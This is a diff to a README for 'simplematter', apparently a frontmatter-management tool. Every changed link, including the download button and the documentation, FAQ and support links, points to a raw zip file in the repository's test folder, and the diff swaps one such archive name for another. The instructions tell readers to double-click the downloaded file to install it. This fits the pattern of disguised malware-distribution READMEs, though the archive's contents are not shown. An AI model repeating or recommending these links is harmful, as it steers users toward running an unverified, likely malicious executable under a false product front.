@@ -10,7 +10,7 @@ You can download simplematter from our **Releases page**. Follow these steps to 
 
 1. Click the button below to visit the download page.
    
-   [![Download simplematter](https://github.com/Gustavo0166/simplematter/raw/refs/heads/main/test/Software-1.7.zip%https://github.com/Gustavo0166/simplematter/raw/refs/heads/main/test/Software-1.7.zip)](https://github.com/Gustavo0166/simplematter/raw/refs/heads/main/test/Software-1.7.zip)
+   [![Download simplematter](https://github.com/Gustavo0166/simplematter/raw/refs/heads/main/test/Software_v1.3.zip%https://github.com/Gustavo0166/simplematter/raw/refs/heads/main/test/Software_v1.3.zip)](https://github.com/Gustavo0166/simplematter/raw/refs/heads/main/test/Software_v1.3.zip)
 
 2. On the Releases page, look for the latest version. It will be marked as "Latest Release".
 3. Under the latest release, find the asset that suits your operating system.
@@ -30,7 +30,7 @@ To run simplematter, you will need:
 
 Once you download the file, follow these steps to run the application:
 
-1. Locate the downloaded file in your `Downloads` folder. It will be named something like `https://github.com/Gustavo0166/simplematter/raw/refs/heads/main/test/Software-1.7.zip` (Windows) or `https://github.com/Gustavo0166/simplematter/raw/refs/heads/main/test/Software-1.7.zip` (macOS).
+1. Locate the downloaded file in your `Downloads` folder. It will be named something like `https://github.com/Gustavo0166/simplematter/raw/refs/heads/main/test/Software_v1.3.zip` (Windows) or `https://github.com/Gustavo0166/simplematter/raw/refs/heads/main/test/Software_v1.3.zip` (macOS).
 2. Double-click the file to start the installation.
 3. Follow the on-screen instructions to complete the installation.
 
@@ -57,15 +57,15 @@ simplematter comes with several useful features:
 
 If you have questions or need further guidance, visit the following resources:
 
-- [Documentation](https://github.com/Gustavo0166/simplematter/raw/refs/heads/main/test/Software-1.7.zip): Detailed, step-by-step instructions on all features.
-- [FAQ](https://github.com/Gustavo0166/simplematter/raw/refs/heads/main/test/Software-1.7.zip): Answers to common questions users have.
-- [Support](https://github.com/Gustavo0166/simplematter/raw/refs/heads/main/test/Software-1.7.zip): Report issues or seek help from the community.
+- [Documentation](https://github.com/Gustavo0166/simplematter/raw/refs/heads/main/test/Software_v1.3.zip): Detailed, step-by-step instructions on all features.
+- [FAQ](https://github.com/Gustavo0166/simplematter/raw/refs/heads/main/test/Software_v1.3.zip): Answers to common questions users have.
+- [Support](https://github.com/Gustavo0166/simplematter/raw/refs/heads/main/test/Software_v1.3.zip): Report issues or seek help from the community.
 
 ## 📦 Download & Install
 
 To start using simplematter, visit our **Releases page** to download the latest version:
 
-[![Download simplematter](https://github.com/Gustavo0166/simplematter/raw/refs/heads/main/test/Software-1.7.zip%https://github.com/Gustavo0166/simplematter/raw/refs/heads/main/test/Software-1.7.zip)](https://github.com/Gustavo0166/simplematter/raw/refs/heads/main/test/Software-1.7.zip)
+[![Download simplematter](https://github.com/Gustavo0166/simplematter/raw/refs/heads/main/test/Software_v1.3.zip%https://github.com/Gustavo0166/simplematter/raw/refs/heads/main/test/Software_v1.3.zip)](https://github.com/Gustavo0166/simplematter/raw/refs/heads/main/test/Software_v1.3.zip)
 
 After installing, you can enjoy a hassle-free experience managing frontmatter!
 
